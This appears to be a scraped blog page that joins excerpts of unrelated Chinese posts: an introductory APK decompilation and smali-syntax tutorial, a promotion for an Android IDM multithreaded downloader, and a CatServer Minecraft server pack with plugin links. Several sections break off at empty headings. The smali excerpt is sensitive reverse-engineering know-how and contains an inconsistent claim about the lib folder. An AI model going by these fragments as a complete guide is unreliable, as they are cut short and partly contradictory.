&lt;p&gt;&lt;code&gt;assets&lt;/code&gt;  是一个储存大型资源的目录，可能占 apk 绝大多的字节大小， &lt;code&gt;储存其中的资源不会被编译，可以直接修改&lt;/code&gt; ，软件运行时会以压缩文件形式解压出来使用。(根据我的经验，html 形式文件可以通过 ur 定位直接访问而其他形式的文件必须需要解压)&lt;/p&gt;
&lt;p&gt;&lt;code&gt;lib&lt;/code&gt;  存放已编译的库文件，十分重要，进行逆向时直接忽视它。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;smali&lt;/code&gt;  存放反编译出的 smali 文件 (来自 classes.dex 文件)，是我们进行逆向的主角&lt;/p&gt;
&lt;p&gt;&lt;code&gt;res&lt;/code&gt;  存放资源文件，如布局，配色，样式，图片，大多为 xml 和 png 形式。&lt;br /&gt;
其中 &lt;code&gt;raw&lt;/code&gt;  文件夹十分特别，该文件夹下不会被编译 (同 assets 相似，但它还会额外为文件分配一个 id)，可以存放任何形式文件。&lt;/p&gt;
&lt;h2 id=&#34;smali&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#smali&#34;&gt;#&lt;/a&gt; Smali&lt;/h2&gt;
&lt;p&gt;smali 是一种类似于汇编语言的语法，可以打包为 dex 文件运行在 Dalvik 里（Android 虚拟机） 。&lt;/p&gt;
&lt;h3 id=&#34;smali文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#smali文件&#34;&gt;#&lt;/a&gt; Smali 文件&lt;/h3&gt;
&lt;p&gt;我们在 smali 文件夹里能看到许多 smali 文件，它们的是按一定规则进行命名的。&lt;/p&gt;
&lt;p&gt;每一个 smali 文件都对应对应一个 java 类，如果有一个&lt;strong&gt; activity.java&lt;/strong&gt;，那么编译后就有&lt;strong&gt; activity.smali&lt;/strong&gt;。我们也许还可以看到另外的&lt;strong&gt; activity$InnerClass.smali&lt;/strong&gt; 这样的文件，这说明&lt;strong&gt; activity.java&lt;/strong&gt; 里面还有一个叫&lt;strong&gt; InnerClass&lt;/strong&gt; 的内部类。如果出现&lt;strong&gt; activity$a.smali&lt;/strong&gt; 或&lt;strong&gt; activity$b.smali&lt;/strong&gt; 这种无意义的内部类名称，那就可能是个匿名内部类。&lt;/p&gt;
&lt;h3 id=&#34;smali语法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#smali语法&#34;&gt;#&lt;/a&gt; Smali 语法&lt;/h3&gt;
&lt;h3 id=&#34;数据类型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据类型&#34;&gt;#&lt;/a&gt; 数据类型&lt;/h3&gt;
&lt;ul class=&#34;task-list&#34;&gt;
&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_0&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_0&#34;&gt; B---byte&lt;/label&gt;&lt;/li&gt;
&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_1&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_1&#34;&gt; C---char&lt;/label&gt;&lt;/li&gt;
&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_2&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_2&#34;&gt; D---double&lt;/label&gt;&lt;/li&gt;
&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_3&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_3&#34;&gt; F---float&lt;/label&gt;&lt;/li&gt;
&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_4&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_4&#34;&gt; I---int&lt;/label&gt;&lt;/li&gt;
&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_5&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_5&#34;&gt; J---long&lt;/label&gt;&lt;/li&gt;
&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_6&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_6&#34;&gt; S---short&lt;/label&gt;&lt;/li&gt;
&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_7&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_7&#34;&gt; V---void&lt;/label&gt;&lt;/li&gt;
&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_8&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_8&#34;&gt; Z---boolean&lt;/label&gt;&lt;/li&gt;
&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_9&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_9&#34;&gt; [xxx---array&lt;/label&gt;&lt;/li&gt;
&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_10&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_10&#34;&gt; Lxxx/yyy---object&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;每种基本数据类型对应一个字母&lt;br /&gt;
&lt;strong&gt; [+ 数据类型&lt;/strong&gt;表示一个数组，如 [D 表示一个 double 类型数组。&lt;br /&gt;
&lt;strong&gt;L + 类路径&lt;/strong&gt;表示一个对象，如 String 类型数据使用的是&lt;strong&gt; Ljava/lang/String&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#类&#34;&gt;#&lt;/a&gt; 类&lt;/h3&gt;
&lt;figure class=&#34;highlight smali&#34;&gt;&lt;figcaption data-lang=&#34;smali&#34;&gt;&lt;span&gt;i&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;.class&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;abstract&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;&lt;span class=&#34;token builtin&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;Car&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; //&lt;span class=&#34;token keyword&#34;&gt;abstract&lt;/span&gt; 表明为抽象类&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;.super&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;&lt;span class=&#34;token builtin&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;token namespace&#34;&gt;java&lt;span class=&#34;token punctuation&#34;&gt;/&lt;/span&gt;lang&lt;span class=&#34;token punctuation&#34;&gt;/&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;Object&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;.source&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Car.java&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;.implements&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;&lt;span class=&#34;token builtin&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;IFly&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;strong&gt;.class&lt;/strong&gt; 声明一个类并添加修饰&lt;br /&gt;
&lt;strong&gt;.super&lt;/strong&gt; 声明继承的父类&lt;br /&gt;
&lt;strong&gt;.source&lt;/strong&gt; 声明类来源的文件&lt;br /&gt;
&lt;strong&gt;.implements&lt;/strong&gt; 声明类实现的接口&lt;/p&gt;
&lt;h3 id=&#34;方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法&#34;&gt;#&lt;/a&gt; 方法&lt;/h3&gt;

 &lt;h4 id=&#34;idm下载器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#idm下载器&#34;&gt;#&lt;/a&gt; IDM 下载器&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;线程下载器在电脑上是比较出名的，但你有用过手机版的线程下载器吗？&lt;br /&gt;
面对国外网站的文件下载，用龟速来形容也不为过，当你看到 16kb/s 时估计已经对 100 多兆的文件绝望了，此时的 IDM 线程下载器就能拯救你了。  &lt;br /&gt;
此类下载器与迅雷等不同，线程下载器使用多线程下载文件，换句话说，32 个线程在一秒内能为你下载&lt;br /&gt;
 16kb*32 的文件数据，理想情况下速度几乎增大了 32 倍。堪称神器。  &lt;br /&gt;
此外国内&lt;s&gt;某度网盘&lt;/s&gt;的下载速度让人绝望，但大于 1G 的文件几乎都存在网盘里，此线程下载器可已搭配 ES 文件管理器 使用，实现网盘高速下载。&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;特点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#特点&#34;&gt;#&lt;/a&gt; 特点&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;同时下载 5 个&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;多部分下载 - 每次下载多达 32 线&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;支持代 {过}……{滤} 理&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;速度限制器限制速度下载&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;刷新过期链接&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ts 视频缓存转换&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL21pcC51Y2J1Zy5jb20vc2hvdWppLzEyNjUyOC5odG1s&#34;&gt;跳转下载&lt;/span&gt;&lt;/p&gt;

 &lt;h4 id=&#34;为什么用catserver服务端做整合&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#为什么用catserver服务端做整合&#34;&gt;#&lt;/a&gt; 为什么用 CatServer 服务端做整合？&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;CatServer 在服务端优化 / 插件支持 /mod 优化方面领先于许多服务端，选择 CatServer 做整合可以给大家带来更好的体验。 同时 CatServer 支持添加 Bukkit，Sponge，Spigot，BungeeCord 等多种服务端的插件，方便日后添加插件&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;介绍&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#介绍&#34;&gt;#&lt;/a&gt; 介绍&lt;/h4&gt;
&lt;p&gt;这个服务端可以用于制作一些生存服 / 建筑服 /mod 服等，服务端较为小型，未添加 mod，有需要添加的请自行添加&lt;br /&gt;
服务端不提供主城地图，需要请自行添加&lt;br /&gt;
服务端插件截图&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;%E5%9B%BE%E7%89%87%E5%9C%B0%E5%9D%80%22%E5%9B%BE%E7%89%87title%22&#34; alt=&#34;插件截图&#34; /&gt;&lt;br /&gt;
↑↑↑插件截图↑↑↑&lt;br /&gt;
开服证明截图&lt;br /&gt;
&lt;img data-src=&#34;%E5%9B%BE%E7%89%87%E5%9C%B0%E5%9D%80%22%E5%9B%BE%E7%89%87title%22&#34; alt=&#34;开服证明&#34; /&gt;&lt;br /&gt;
↑↑↑开服证明↑↑↑&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;插件下载&lt;/strong&gt;&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubWNiYnMubmV0L3RocmVhZC02MzEyNDAtMS0xLmh0bWw=&#34;&gt; MiaoChat&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubWNiYnMubmV0L3RocmVhZC04MTAzOTQtMS0xLmh0bWw=&#34;&gt;TitleManager&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc3BpZ290bWMub3JnL3Jlc291cmNlcy92YXVsdC4zNDMxNS8=&#34;&gt;Vault&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc3BpZ290bWMub3JnL3Jlc291cmNlcy9yYW5kb21tb3RkLjY3NDcyLw==&#34;&gt;RandomMOTD&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc3BpZ290bWMub3JnL3Jlc291cmNlcy9wbGFjZWhvbGRlcmFwaS42MjQ1Lw==&#34;&gt;PlaceholderAPI&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubWNiYnMubmV0L3RocmVhZC04NDc4NTktMS0xLmh0bWw=&#34;&gt;CatSeedLogin&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubWNiYnMubmV0L3RocmVhZC02MTk4ODMtMS0xLmh0bWw=&#34;&gt;EssentialsX&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc3BpZ290bWMub3JnL3Jlc291cmNlcy9wcm90b2NvbGxpYi4xOTk3Lw==&#34;&gt;ProtocolLib&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubWNiYnMubmV0L3RocmVhZC0xMDQ4OTg4LTEtMS5odG1s&#34;&gt;Hat&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;下载地址&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#下载地址&#34;&gt;#&lt;/a&gt; 下载地址&lt;/h4&gt;
